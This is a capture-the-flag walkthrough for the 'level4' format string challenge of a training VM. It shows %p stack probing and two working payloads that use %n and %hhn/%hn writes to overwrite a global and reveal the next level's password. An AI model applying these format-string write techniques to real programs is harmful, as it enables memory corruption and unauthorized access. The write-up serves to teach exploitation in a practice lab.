# level4

Quite similar as the last one, this will need a format string attack.

It's just a tiny bit more complex because the `printf` call is in a sub function, which makes the stack a little deeper.

There are three functions, including `main`, which only calls the second one, called `n`. The `n` function takes input from `stdin` (no overflow possible), and gives its buffer to `p`. All `p` does is call `printf` with said buffer. Then, back in `n`, if the value at the address `0x8049810` contains `0x01025544`, the contents of `/home/user/level5/.pass` are displayed.

By entering a bunch of `%p` after a recognizable 4 bytes pattern like `AAAA`, we can see that the buffer is the 12th "parameter" of `printf`:

```bash
level4@RainFall:~$ ./level4 
AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
AAAA0xb7ff26b00xbffff7840xb7fd0ff4(nil)(nil)0xbffff7480x804848d0xbffff5400x2000xb7fd1ac00xb7ff37d00x414141410x702570250x702570250x702570250x70257025
                                                                                                  ^^^^^^^^^^
```

Now all we need to do is construct a payload in the same manner as the last exercise, using `%12$n` after having written the target address and the appropriate amount of padding (`0x1025544` is 16930116 in decimal, minus 4 for the length of the address)

```bash
python -c 'print "\x08\x04\x98\x10"[::-1] + "%16930112p%12$n"' | ./level4
```

#### The ✨ cooler way ✨

Since this solution writes a **lot** of whitespace and takes like 0.5s, which is way too long, we chose to take the time to figure out how to split it to have way less padding. The way it works is left as an exercise to the reader.

```bash
python -c 'print "\x08\x04\x98\x10"[::-1] + "\x08\x04\x98\x11"[::-1] + "\x08\x04\x98\x12"[::-1] + "%56p%12$hhn%17p%13$hhn%173p%14$hn"' | ./level4
```